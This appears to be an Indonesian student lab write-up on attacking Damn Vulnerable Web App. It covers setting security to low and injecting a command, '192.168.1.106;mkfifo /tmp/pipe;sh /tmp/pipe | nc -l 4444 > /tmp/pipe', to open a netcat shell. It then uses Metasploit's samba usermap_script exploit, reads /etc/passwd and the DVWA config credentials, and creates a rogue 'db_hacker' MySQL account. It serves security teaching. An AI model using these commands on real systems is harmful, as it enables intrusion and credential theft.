##### TUGAS 3 PKSJ
# Damn Vulnerable Web App (DVWA) Menggunakan Metasploit dengan Command Execution
## Pendahuluan
Damn Vulnerable Web App (DVWA) adalah PHP/MySQL web application yang sangat rentan terhadap serangan.
Tujuan utama penggunaan DVWA adalah sebagai alat bantu untuk menguji tools dan kemampuan bagi web developer. Khususnya, digunakan untuk  lebih memahami proses pengamanan aplikasi web
Dalam simulasi ini, yang akan kami lakukan adalah
- Menguji Command Execution dimana Security telah disetting levelnya menjadi sangat rendah
- Memulai Metasploit di Backtrack dan terhubung ke sesi Netcat yang dibuat di dalam DVWA.
- Menggunakan nama pengguna apache untuk mencari kelemahan sistem yang potensial
- Menemukan file php yang dilindungi dengan lemah yang berisi database credentials
- Menggunakan database credentials tersebt untuk mengambil alih database


###### Anggota Kelompok :
| Nama        | NRP         |
|:-------------:|:-----:|
M Rasyid Karomi  |  5114100101
Miftakhul Akhyar |  5114100143
Faiq Firdausi    |  5114100165

## Proses Simulasi
### Cek IP Metasploit Linux
Ketikan perintah untuk mencari alamat IP
```
ifconfig eth1
```
![1 cek ip metasploit linux](https://user-images.githubusercontent.com/24241201/34205322-823a5362-e5b4-11e7-8f7c-52e905141cb0.JPG)



### Membuka DVWA
Buka DVWA dengan mengetikkan alamat IP pada browser
![2 akses ip lewat browser](https://user-images.githubusercontent.com/24241201/34205323-8276223e-e5b4-11e7-9c5f-e8b6333d88c0.JPG)

![3 tampilan halaman dvwa setelah login](https://user-images.githubusercontent.com/24241201/34205324-82b7f84e-e5b4-11e7-9d3f-845cde2ac27e.JPG)

### Set Security DVWA menjadi low
Pilih menu DVWA Security, kemudian set Security dari high menjadi low
![4 pilih menu dvwa security](https://user-images.githubusercontent.com/24241201/34205325-82fd75c2-e5b4-11e7-9ad2-6d53b995d618.JPG)

![5 set security jadi low](https://user-images.githubusercontent.com/24241201/34205327-8341da78-e5b4-11e7-9a7d-7b7a2986243c.JPG)


### Command Execution
Pilih menu Command Execution, kemudian coba lakukan ping server metasploit dengan memasukkan alamat IP
![6 pilih menu command execution lalu coba ping server metasploit](https://user-images.githubusercontent.com/24241201/34205328-837b6cca-e5b4-11e7-8b6d-fd9e4e74873a.JPG)


Masukkan command sebagai berikut, maka halaman akan loading
```
192.168.1.106;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```
![7 masukkan command maka akan loading](https://user-images.githubusercontent.com/24241201/34205330-83b48906-e5b4-11e7-944a-b1de92f54ebf.JPG)


### Memulai Metasploit
Ketikkan perintah ke terminal sebagai berikut
```
use exploit.multi. samba. usermap_script
```
![8 ketikkan use exploit multi samba usermap_script](https://user-images.githubusercontent.com/24241201/34205331-83f51070-e5b4-11e7-9916-88022d14b643.JPG)

Kemudian untuk membuka opsi, ketikkan perintah ke terminal sebagai berikut 
```
show options
```
![9 ketikkan show options](https://user-images.githubusercontent.com/24241201/34205332-842dde5a-e5b4-11e7-8057-d9afbeefc932.JPG)

Set RHOST alamat IP kemudian exploit
```
set RHOST 192.168.1.21
```
![10 set rhost server dvwa](https://user-images.githubusercontent.com/24241201/34205333-84689d10-e5b4-11e7-9adb-b6945fed0adb.JPG)

![11 exploit](https://user-images.githubusercontent.com/24241201/34205334-84b78024-e5b4-11e7-9574-2df3094a4d39.JPG)


### Mencari Database Credentials
Pastikan user adalah root dengan memberi perintah whoami pada terminal
![12 ketik whoami](https://user-images.githubusercontent.com/24241201/34205335-84f742b8-e5b4-11e7-9f2e-ee0943077a40.JPG)

Ketikkan perintah grep pada terminal
```
grep root /etc/passwd
grep root /etc/group
```
![13 ketik grep etc passwd grep etc group](https://user-images.githubusercontent.com/24241201/34205336-852d9eda-e5b4-11e7-904a-c09d21425454.JPG)

Explore directory credentials

![14 explore directory credentials](https://user-images.githubusercontent.com/24241201/34205337-8567f71a-e5b4-11e7-9eab-741e84576f88.JPG)

Lihat permission dari file config terlihat bahwa permisson rw-r-r (644) maka file dapat dibuka
![15 lihat permission dari file config terlihat bahwa permisson rw-r-r 644 maka file dapat dibuka](https://user-images.githubusercontent.com/24241201/34205338-85a111a8-e5b4-11e7-9f63-4765491b0617.JPG)

Ketikkan perintah cat pada file config maka dapat melihat password dvwa
```
cat /var/www/dvwa/config/config.inc.php
```
![16 ketikkan perintah cat pada file config maka dapat melihat password dvwa](https://user-images.githubusercontent.com/24241201/34205341-85de778c-e5b4-11e7-88d1-400eb91a4212.JPG)


Gunakan perintah show databases tanpa -p karena password null

![17 gunakan perintah show databases tanpa -p karena password null](https://user-images.githubusercontent.com/24241201/34205342-8614d4b2-e5b4-11e7-9960-109d70ff3c64.JPG)


### Mengambil alih Database

Masuk pada database dvwa dan gunakan perintah show tables lalu gunakan perintah select all from users

![18 masuk pada database dvwa dan gunakan perintah show tables lalu gunakan perintah select all from users](https://user-images.githubusercontent.com/24241201/34205343-864c36a0-e5b4-11e7-8545-ea705a390e8f.JPG)

Insert data faiq firdausy sebagai user lalu select table dvwa users
![19 insert data faiq firdausy sebagai user lalu select table dvwa users](https://user-images.githubusercontent.com/24241201/34205345-868e2466-e5b4-11e7-96d1-d67f94b204d3.JPG)

Masuk pada database mysql

![20 masuk pada database mysql](https://user-images.githubusercontent.com/24241201/34205346-86ca2ba0-e5b4-11e7-9e50-4061c594f33e.JPG)

Buat akun user baru dengan nama db_hacker dan password faiq
![21 buat akun user baru dengan nama db_hacker dan password faiq](https://user-images.githubusercontent.com/24241201/34205347-8705ed66-e5b4-11e7-8e1b-3194199c4f8b.JPG)

Select semua data di tabel user database mysql maka ada user db_hacker
![22 select semua data di tabel user database mysql maka ada user db_hacker](https://user-images.githubusercontent.com/24241201/34205316-81309c10-e5b4-11e7-9894-e8706b8d55f6.JPG)

Buka terminal baru masuk melalui user database baru db_hacker password faiq
![23 buka terminal baru masuk melalui user database baru db_hacker password faiq](https://user-images.githubusercontent.com/24241201/34205317-817040ea-e5b4-11e7-8292-abc5a882cd87.JPG)

Gunakan perintah show databases untuk melihat semua database
![24 gunakan perintah show databases untuk melihat semua database](https://user-images.githubusercontent.com/24241201/34205318-81c263c0-e5b4-11e7-9c8f-5c90948b55b5.JPG)




